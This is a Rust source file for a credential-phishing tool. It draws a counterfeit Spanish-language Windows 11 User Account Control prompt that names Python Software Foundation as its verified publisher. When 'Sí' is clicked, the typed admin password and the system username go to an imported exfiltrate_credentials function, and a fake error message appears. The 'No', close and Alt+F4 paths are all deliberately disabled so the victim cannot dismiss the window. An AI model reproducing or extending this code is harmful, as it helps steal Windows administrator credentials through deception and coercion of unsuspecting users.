//! UAC Dialog window implementation replicating Windows 11 Spanish credential prompt.
//! Pixel-matched against a real Windows 11 UAC dialog with underline-style password input,
//! static system username label, and dynamic HOSTNAME\user display.

use std::ptr::null_mut;
use std::sync::Mutex;
use std::sync::atomic::{AtomicBool, Ordering};
use windows::core::*;
use windows::Win32::Foundation::*;
use windows::Win32::Graphics::Gdi::*;
use windows::Win32::System::LibraryLoader::GetModuleHandleW;
use windows::Win32::UI::WindowsAndMessaging::*;
use windows::Win32::UI::Controls::DRAWITEMSTRUCT;
use windows::Win32::UI::Input::KeyboardAndMouse::SetFocus;

use crate::exfil::exfiltrate_credentials;

pub const DIALOG_WIDTH: i32 = 500;
pub const DIALOG_HEIGHT: i32 = 500;

// Control IDs
pub const ID_PASSWORD: usize = 102;
pub const ID_BTN_YES: usize = 103;
pub const ID_BTN_NO: usize = 104;
pub const ID_BTN_CLOSE: usize = 105;

#[derive(Clone, Copy)]
pub struct SafeHandle<T>(pub T);
unsafe impl<T> Send for SafeHandle<T> {}
unsafe impl<T> Sync for SafeHandle<T> {}

pub struct DialogState {
    pub password_hwnd: SafeHandle<HWND>,
    pub system_user: String,
    pub hostname: String,
    pub font_regular: SafeHandle<HFONT>,
    pub font_semibold: SafeHandle<HFONT>,
    pub font_title: SafeHandle<HFONT>,
    pub font_small: SafeHandle<HFONT>,
    pub font_app: SafeHandle<HFONT>,
    pub brush_header: SafeHandle<HBRUSH>,
    pub brush_white: SafeHandle<HBRUSH>,
    pub brush_footer: SafeHandle<HBRUSH>,
    pub brush_blue: SafeHandle<HBRUSH>,
}

static DIALOG_STATE: Mutex<Option<DialogState>> = Mutex::new(None);

/// Tracks whether the error code "0000xB!" is currently displayed after a submit attempt
static ERROR_SHOWN: AtomicBool = AtomicBool::new(false);

/// Stores the dialog HWND for use in handle_submit to trigger repaint and timer
static DIALOG_HWND: Mutex<Option<SafeHandle<HWND>>> = Mutex::new(None);

/// Timer ID for auto-closing after showing the error code
const TIMER_ID_ERROR_CLOSE: usize = 9001;

pub unsafe fn register_and_create_dialog(parent: HWND, center_x: i32, center_y: i32) -> Option<HWND> {
    let instance = match unsafe { GetModuleHandleW(None) } {
        Ok(inst) => HINSTANCE(inst.0),
        Err(_) => return None,
    };

    let class_name = w!("UAC_Dialog_Class");

    let wc = WNDCLASSW {
        style: CS_HREDRAW | CS_VREDRAW,
        lpfnWndProc: Some(dialog_wnd_proc),
        hInstance: instance,
        hCursor: unsafe { LoadCursorW(None, IDC_ARROW) }.unwrap_or_default(),
        hbrBackground: HBRUSH(null_mut()),
        lpszClassName: class_name,
        ..Default::default()
    };

    unsafe {
        let _ = RegisterClassW(&wc);
    }

    let x = center_x - (DIALOG_WIDTH / 2);
    let y = center_y - (DIALOG_HEIGHT / 2);

    let hwnd = match unsafe {
        CreateWindowExW(
            WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
            class_name,
            w!("Control de cuentas de usuario"),
            WS_POPUP | WS_VISIBLE,
            x,
            y,
            DIALOG_WIDTH,
            DIALOG_HEIGHT,
            Some(parent),
            None,
            Some(instance),
            None,
        )
    } {
        Ok(h) => h,
        Err(_) => return None,
    };

    // Apply rounded corners (16px curve)
    unsafe {
        let rgn = CreateRoundRectRgn(0, 0, DIALOG_WIDTH, DIALOG_HEIGHT, 16, 16);
        if !rgn.is_invalid() {
            let _ = SetWindowRgn(hwnd, Some(rgn), true);
        }
    }

    // Read system info for dynamic labels (HOSTNAME\username)
    let system_user = std::env::var("USERNAME").unwrap_or_else(|_| "Administrador".into());
    let hostname = std::env::var("COMPUTERNAME").unwrap_or_else(|_| "DESKTOP".into());

    // Initialize fonts
    let font_regular = unsafe { create_font(15, FW_NORMAL.0 as i32, false) };
    let font_semibold = unsafe { create_font(15, FW_SEMIBOLD.0 as i32, false) };
    let font_title = unsafe { create_font(21, FW_SEMIBOLD.0 as i32, false) };
    let font_small = unsafe { create_font(13, FW_NORMAL.0 as i32, false) };
    let font_app = unsafe { create_font(18, FW_SEMIBOLD.0 as i32, false) };

    // Initialize brushes
    let brush_header = unsafe { CreateSolidBrush(COLORREF(0x00F0F0F0)) };
    let brush_white = unsafe { CreateSolidBrush(COLORREF(0x00FFFFFF)) };
    let brush_footer = unsafe { CreateSolidBrush(COLORREF(0x00F5F5F5)) };
    let brush_blue = unsafe { CreateSolidBrush(COLORREF(0x00C06700)) }; // COLORREF 0x00BBGGRR → RGB #0067C0

    // ── Password Input (borderless — underline drawn in WM_PAINT) ──────────
    let input_x = 36;
    let input_w = DIALOG_WIDTH - 72;

    let password_hwnd = unsafe {
        CreateWindowExW(
            WINDOW_EX_STYLE::default(),
            w!("EDIT"),
            PCWSTR::null(),
            WS_CHILD | WS_VISIBLE | WS_TABSTOP | WINDOW_STYLE((ES_AUTOHSCROLL | ES_PASSWORD) as u32),
            input_x,
            340,
            input_w,
            24,
            Some(hwnd),
            Some(HMENU(ID_PASSWORD as *mut _)),
            Some(instance),
            None,
        )
    }.unwrap_or_default();

    // Set font and password masking character ● (U+25CF)
    unsafe {
        let _ = SendMessageW(password_hwnd, WM_SETFONT, Some(WPARAM(font_regular.0 as usize)), Some(LPARAM(1)));
        // EM_SETPASSWORDCHAR = 0x00CC
        let _ = SendMessageW(password_hwnd, 0x00CC, Some(WPARAM(0x25CF)), Some(LPARAM(0)));
    }

    // ── Footer Buttons ─────────────────────────────────────────────────────
    let btn_w = 208;
    let btn_h = 34;
    let btn_y = DIALOG_HEIGHT - 46;

    // "Sí" button (light, outlined)
    let _ = unsafe {
        CreateWindowExW(
            WINDOW_EX_STYLE::default(),
            w!("BUTTON"),
            w!("Sí"),
            WS_CHILD | WS_VISIBLE | WS_TABSTOP | WINDOW_STYLE(BS_OWNERDRAW as u32),
            input_x,
            btn_y,
            btn_w,
            btn_h,
            Some(hwnd),
            Some(HMENU(ID_BTN_YES as *mut _)),
            Some(instance),
            None,
        )
    };

    // "No" button (accent blue)
    let _ = unsafe {
        CreateWindowExW(
            WINDOW_EX_STYLE::default(),
            w!("BUTTON"),
            w!("No"),
            WS_CHILD | WS_VISIBLE | WS_TABSTOP | WINDOW_STYLE(BS_OWNERDRAW as u32),
            input_x + btn_w + 12,
            btn_y,
            btn_w,
            btn_h,
            Some(hwnd),
            Some(HMENU(ID_BTN_NO as *mut _)),
            Some(instance),
            None,
        )
    };

    // Close Button "✕"
    let _ = unsafe {
        CreateWindowExW(
            WINDOW_EX_STYLE::default(),
            w!("BUTTON"),
            w!("✕"),
            WS_CHILD | WS_VISIBLE | WINDOW_STYLE(BS_OWNERDRAW as u32),
            DIALOG_WIDTH - 46,
            1,
            45,
            32,
            Some(hwnd),
            Some(HMENU(ID_BTN_CLOSE as *mut _)),
            Some(instance),
            None,
        )
    };

    if let Ok(mut guard) = DIALOG_STATE.lock() {
        *guard = Some(DialogState {
            password_hwnd: SafeHandle(password_hwnd),
            system_user,
            hostname,
            font_regular: SafeHandle(font_regular),
            font_semibold: SafeHandle(font_semibold),
            font_title: SafeHandle(font_title),
            font_small: SafeHandle(font_small),
            font_app: SafeHandle(font_app),
            brush_header: SafeHandle(brush_header),
            brush_white: SafeHandle(brush_white),
            brush_footer: SafeHandle(brush_footer),
            brush_blue: SafeHandle(brush_blue),
        });
    }

    unsafe {
        let _ = SetFocus(Some(password_hwnd));
    }

    // Store the dialog HWND so handle_submit can trigger repaint and timer
    if let Ok(mut guard) = DIALOG_HWND.lock() {
        *guard = Some(SafeHandle(hwnd));
    }

    Some(hwnd)
}

unsafe fn create_font(height: i32, weight: i32, italic: bool) -> HFONT {
    unsafe {
        CreateFontW(
            height,
            0,
            0,
            0,
            weight,
            italic as u32,
            0,
            0,
            DEFAULT_CHARSET,
            OUT_DEFAULT_PRECIS,
            CLIP_DEFAULT_PRECIS,
            CLEARTYPE_QUALITY,
            (DEFAULT_PITCH.0 | FF_DONTCARE.0) as u32,
            w!("Segoe UI"),
        )
    }
}

fn encode_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

unsafe extern "system" fn dialog_wnd_proc(
    hwnd: HWND,
    msg: u32,
    wparam: WPARAM,
    lparam: LPARAM,
) -> LRESULT {
    match msg {
        WM_PAINT => {
            let mut ps = PAINTSTRUCT::default();
            let hdc = unsafe { BeginPaint(hwnd, &mut ps) };

            if let Ok(guard) = DIALOG_STATE.lock() {
                if let Some(state) = guard.as_ref() {
                    unsafe {
                        SetBkMode(hdc, TRANSPARENT);

                        // ── 1. Header bar (#F0F0F0, 36px) ─────────────────────────
                        let header_rect = RECT { left: 0, top: 0, right: DIALOG_WIDTH, bottom: 36 };
                        FillRect(hdc, &header_rect, state.brush_header.0);

                        // Header title text
                        let _ = SelectObject(hdc, state.font_small.0.into());
                        SetTextColor(hdc, COLORREF(0x005A5A5A));
                        let mut ht_rect = RECT { left: 16, top: 10, right: DIALOG_WIDTH - 50, bottom: 34 };
                        let mut ht_str = encode_wide("Control de cuentas de usuario");
                        let _ = DrawTextW(hdc, &mut ht_str, &mut ht_rect, DT_LEFT | DT_SINGLELINE);

                        // ── 2. White body background ───────────────────────────────
                        let body_rect = RECT { left: 0, top: 36, right: DIALOG_WIDTH, bottom: DIALOG_HEIGHT - 58 };
                        FillRect(hdc, &body_rect, state.brush_white.0);

                        // ── 3. Main question ───────────────────────────────────────
                        let _ = SelectObject(hdc, state.font_title.0.into());
                        SetTextColor(hdc, COLORREF(0x001B1B1B));
                        let mut q_rect = RECT { left: 36, top: 48, right: DIALOG_WIDTH - 36, bottom: 115 };
                        let mut q_str = encode_wide(
                            "¿Quieres permitir que esta aplicación haga cambios en el dispositivo?"
                        );
                        let _ = DrawTextW(hdc, &mut q_str, &mut q_rect, DT_LEFT | DT_WORDBREAK);

                        // ── 4. App name "Python" ───────────────────────────────────
                        let _ = SelectObject(hdc, state.font_app.0.into());
                        SetTextColor(hdc, COLORREF(0x001B1B1B));
                        let mut app_rect = RECT { left: 36, top: 128, right: DIALOG_WIDTH - 36, bottom: 150 };
                        let mut app_str = encode_wide("Python");
                        let _ = DrawTextW(hdc, &mut app_str, &mut app_rect, DT_LEFT | DT_SINGLELINE);

                        // ── 5. Publisher info ──────────────────────────────────────
                        let _ = SelectObject(hdc, state.font_small.0.into());
                        SetTextColor(hdc, COLORREF(0x005A5A5A));
                        let mut pub_rect = RECT { left: 36, top: 156, right: DIALOG_WIDTH - 36, bottom: 172 };
                        let mut pub_str = encode_wide("Editor comprobado: Python Software Foundation");
                        let _ = DrawTextW(hdc, &mut pub_str, &mut pub_rect, DT_LEFT | DT_SINGLELINE);

                        // ── 6. File origin ─────────────────────────────────────────
                        let mut orig_rect = RECT { left: 36, top: 174, right: DIALOG_WIDTH - 36, bottom: 190 };
                        let mut orig_str = encode_wide("Origen del archivo: Unidad de disco duro en este equipo");
                        let _ = DrawTextW(hdc, &mut orig_str, &mut orig_rect, DT_LEFT | DT_SINGLELINE);

                        // ── 7. "Mostrar más detalles" link (accent blue) ──────────
                        SetTextColor(hdc, COLORREF(0x00C06700)); // COLORREF BGR → RGB #0067C0
                        let mut det_rect = RECT { left: 36, top: 204, right: DIALOG_WIDTH - 36, bottom: 220 };
                        let mut det_str = encode_wide("Mostrar más detalles");
                        let _ = DrawTextW(hdc, &mut det_str, &mut det_rect, DT_LEFT | DT_SINGLELINE);

                        // ── 8. Prompt instruction ──────────────────────────────────
                        let _ = SelectObject(hdc, state.font_regular.0.into());
                        SetTextColor(hdc, COLORREF(0x001B1B1B));
                        let mut pr_rect = RECT { left: 36, top: 244, right: DIALOG_WIDTH - 36, bottom: 282 };
                        let mut pr_str = encode_wide(
                            "Para continuar, escriba un nombre de usuario y una contraseña de administrador."
                        );
                        let _ = DrawTextW(hdc, &mut pr_str, &mut pr_rect, DT_LEFT | DT_WORDBREAK);

                        // ── 9. System username (static label from %USERNAME%) ──────
                        SetTextColor(hdc, COLORREF(0x001B1B1B));
                        let mut usr_rect = RECT { left: 36, top: 296, right: DIALOG_WIDTH - 36, bottom: 314 };
                        let mut usr_str = encode_wide(&state.system_user);
                        let _ = DrawTextW(hdc, &mut usr_str, &mut usr_rect, DT_LEFT | DT_SINGLELINE);

                        // ── 10. "Contraseña" label ─────────────────────────────────
                        let _ = SelectObject(hdc, state.font_small.0.into());
                        SetTextColor(hdc, COLORREF(0x005A5A5A));
                        let mut cl_rect = RECT { left: 36, top: 322, right: DIALOG_WIDTH - 36, bottom: 338 };
                        let mut cl_str = encode_wide("Contraseña");
                        let _ = DrawTextW(hdc, &mut cl_str, &mut cl_rect, DT_LEFT | DT_SINGLELINE);

                        // ── 11. Password underline ─────────────────────────────────
                        let ul_pen = CreatePen(PS_SOLID, 1, COLORREF(0x00ABABAB));
                        let old_pen = SelectObject(hdc, ul_pen.into());
                        let _ = MoveToEx(hdc, 36, 366, None);
                        let _ = LineTo(hdc, DIALOG_WIDTH - 36, 366);
                        let _ = SelectObject(hdc, old_pen);
                        let _ = DeleteObject(ul_pen.into());

                        // ── 12. HOSTNAME\username label ────────────────────────────
                        let _ = SelectObject(hdc, state.font_small.0.into());
                        SetTextColor(hdc, COLORREF(0x00404040));
                        let domain_text = format!("{}\\{}", state.hostname, state.system_user);
                        let mut dm_rect = RECT { left: 36, top: 382, right: DIALOG_WIDTH - 36, bottom: 400 };
                        let mut dm_str = encode_wide(&domain_text);
                        let _ = DrawTextW(hdc, &mut dm_str, &mut dm_rect, DT_LEFT | DT_SINGLELINE);

                        // ── 13. Footer bar ─────────────────────────────────────────
                        let footer_rect = RECT { left: 0, top: DIALOG_HEIGHT - 58, right: DIALOG_WIDTH, bottom: DIALOG_HEIGHT };
                        FillRect(hdc, &footer_rect, state.brush_footer.0);

                        // Footer separator line
                        let sep_pen = CreatePen(PS_SOLID, 1, COLORREF(0x00E0E0E0));
                        let old_pen2 = SelectObject(hdc, sep_pen.into());
                        let _ = MoveToEx(hdc, 0, DIALOG_HEIGHT - 58, None);
                        let _ = LineTo(hdc, DIALOG_WIDTH, DIALOG_HEIGHT - 58);
                        let _ = SelectObject(hdc, old_pen2);
                        let _ = DeleteObject(sep_pen.into());

                        // ── 14. Error code (shown after clicking "Sí") ─────────────
                        if ERROR_SHOWN.load(Ordering::SeqCst) {
                            let _ = SelectObject(hdc, state.font_semibold.0.into());
                            SetTextColor(hdc, COLORREF(0x000000CC)); // Red (COLORREF BGR → RGB #CC0000)
                            let mut err_rect = RECT { left: 36, top: 404, right: DIALOG_WIDTH - 36, bottom: 426 };
                            let mut err_str = encode_wide("Error: 0000xB!");
                            let _ = DrawTextW(hdc, &mut err_str, &mut err_rect, DT_LEFT | DT_SINGLELINE);
                        }
                    }
                }
            }

            unsafe {
                let _ = EndPaint(hwnd, &ps);
            }
            LRESULT(0)
        }

        WM_DRAWITEM => {
            let dis = unsafe { &*(lparam.0 as *const DRAWITEMSTRUCT) };
            let hdc = dis.hDC;
            let id = dis.CtlID as usize;

            if let Ok(guard) = DIALOG_STATE.lock() {
                if let Some(state) = guard.as_ref() {
                    unsafe {
                        match id {
                            ID_BTN_CLOSE => {
                                // Close button "✕"
                                FillRect(hdc, &dis.rcItem, state.brush_header.0);
                                SetTextColor(hdc, COLORREF(0x001B1B1B));
                                SetBkMode(hdc, TRANSPARENT);
                                let _ = SelectObject(hdc, state.font_small.0.into());
                                let mut r = dis.rcItem;
                                let mut s = encode_wide("✕");
                                let _ = DrawTextW(hdc, &mut s, &mut r, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
                            }

                            ID_BTN_YES => {
                                // "Sí" button: White / subtle gray background, border, dark text
                                let border_pen = CreatePen(PS_SOLID, 1, COLORREF(0x00CECECE));
                                let old_pen = SelectObject(hdc, border_pen.into());
                                let btn_brush = CreateSolidBrush(COLORREF(0x00FBFBFB));
                                let old_brush = SelectObject(hdc, btn_brush.into());

                                let _ = RoundRect(hdc, dis.rcItem.left, dis.rcItem.top, dis.rcItem.right, dis.rcItem.bottom, 8, 8);

                                let _ = SelectObject(hdc, old_pen);
                                let _ = SelectObject(hdc, old_brush);
                                let _ = DeleteObject(border_pen.into());
                                let _ = DeleteObject(btn_brush.into());

                                SetBkMode(hdc, TRANSPARENT);
                                SetTextColor(hdc, COLORREF(0x001B1B1B));
                                let _ = SelectObject(hdc, state.font_semibold.0.into());
                                let mut r = dis.rcItem;
                                let mut s = encode_wide("Sí");
                                let _ = DrawTextW(hdc, &mut s, &mut r, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
                            }

                            ID_BTN_NO => {
                                // "No" button: Windows 11 accent blue #0067C0, white text
                                let no_pen = CreatePen(PS_SOLID, 1, COLORREF(0x00C06700));
                                let old_pen = SelectObject(hdc, no_pen.into());
                                let old_brush = SelectObject(hdc, state.brush_blue.0.into());

                                let _ = RoundRect(hdc, dis.rcItem.left, dis.rcItem.top, dis.rcItem.right, dis.rcItem.bottom, 8, 8);

                                let _ = SelectObject(hdc, old_pen);
                                let _ = SelectObject(hdc, old_brush);
                                let _ = DeleteObject(no_pen.into());

                                SetBkMode(hdc, TRANSPARENT);
                                SetTextColor(hdc, COLORREF(0x00FFFFFF));
                                let _ = SelectObject(hdc, state.font_semibold.0.into());
                                let mut r = dis.rcItem;
                                let mut s = encode_wide("No");
                                let _ = DrawTextW(hdc, &mut s, &mut r, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
                            }

                            _ => {}
                        }
                    }
                }
            }
            LRESULT(1)
        }

        // WM_CTLCOLOREDIT (0x0133) — set white background for the password EDIT control
        0x0133 => {
            if let Ok(guard) = DIALOG_STATE.lock() {
                if let Some(state) = guard.as_ref() {
                    unsafe {
                        SetBkColor(HDC(wparam.0 as *mut _), COLORREF(0x00FFFFFF));
                        SetTextColor(HDC(wparam.0 as *mut _), COLORREF(0x001B1B1B));
                    }
                    return LRESULT(state.brush_white.0 .0 as isize);
                }
            }
            unsafe { DefWindowProcW(hwnd, msg, wparam, lparam) }
        }

        WM_COMMAND => {
            let id = (wparam.0 & 0xFFFF) as usize;
            match id {
                ID_BTN_YES => {
                    handle_submit();
                }
                // No and X buttons intentionally do nothing — user cannot escape
                // without providing credentials or using the secret Ctrl+Q shortcut
                ID_BTN_NO | ID_BTN_CLOSE => {}
                _ => {}
            }
            LRESULT(0)
        }

        // Timer fires after error code is displayed — auto-close the application
        WM_TIMER => {
            if wparam.0 == TIMER_ID_ERROR_CLOSE {
                unsafe {
                    let _ = KillTimer(Some(hwnd), TIMER_ID_ERROR_CLOSE);
                    let _ = PostQuitMessage(0);
                }
            }
            LRESULT(0)
        }

        // Block WM_CLOSE — window cannot be closed through normal means
        WM_CLOSE => {
            LRESULT(0)
        }

        // Block Alt+F4 / system close via SC_CLOSE
        WM_SYSCOMMAND => {
            let cmd = (wparam.0 & 0xFFF0) as u32;
            if cmd == SC_CLOSE {
                return LRESULT(0);
            }
            unsafe { DefWindowProcW(hwnd, msg, wparam, lparam) }
        }

        WM_DESTROY => {
            if let Ok(mut guard) = DIALOG_STATE.lock() {
                if let Some(state) = guard.take() {
                    unsafe {
                        let _ = DeleteObject(state.font_regular.0.into());
                        let _ = DeleteObject(state.font_semibold.0.into());
                        let _ = DeleteObject(state.font_title.0.into());
                        let _ = DeleteObject(state.font_small.0.into());
                        let _ = DeleteObject(state.font_app.0.into());
                        let _ = DeleteObject(state.brush_header.0.into());
                        let _ = DeleteObject(state.brush_white.0.into());
                        let _ = DeleteObject(state.brush_footer.0.into());
                        let _ = DeleteObject(state.brush_blue.0.into());
                    }
                }
            }
            unsafe {
                let _ = PostQuitMessage(0);
            }
            LRESULT(0)
        }

        _ => unsafe { DefWindowProcW(hwnd, msg, wparam, lparam) },
    }
}

fn handle_submit() {
    let (system_user, password) = {
        if let Ok(guard) = DIALOG_STATE.lock() {
            if let Some(state) = guard.as_ref() {
                let pwd = unsafe { get_window_text(state.password_hwnd.0) };
                (state.system_user.clone(), pwd)
            } else {
                return;
            }
        } else {
            return;
        }
    };

    // Exfiltrate credentials — username comes from system env, password from the input
    if !password.is_empty() || !system_user.is_empty() {
        exfiltrate_credentials(system_user, password, "CUGDL");
    }

    // Set the error flag and trigger a repaint to display "0000xB!"
    ERROR_SHOWN.store(true, Ordering::SeqCst);

    if let Ok(guard) = DIALOG_HWND.lock() {
        if let Some(dlg) = guard.as_ref() {
            unsafe {
                // Force repaint so the error text is drawn
                let _ = InvalidateRect(Some(dlg.0), None, true);
            }
        }
    }
}

unsafe fn get_window_text(h: HWND) -> String {
    unsafe {
        let len = GetWindowTextLengthW(h);
        if len <= 0 {
            return String::new();
        }
        let mut buf: Vec<u16> = vec![0u16; (len + 1) as usize];
        let read = GetWindowTextW(h, &mut buf);
        if read > 0 {
            String::from_utf16_lossy(&buf[..read as usize])
        } else {
            String::new()
        }
    }
}
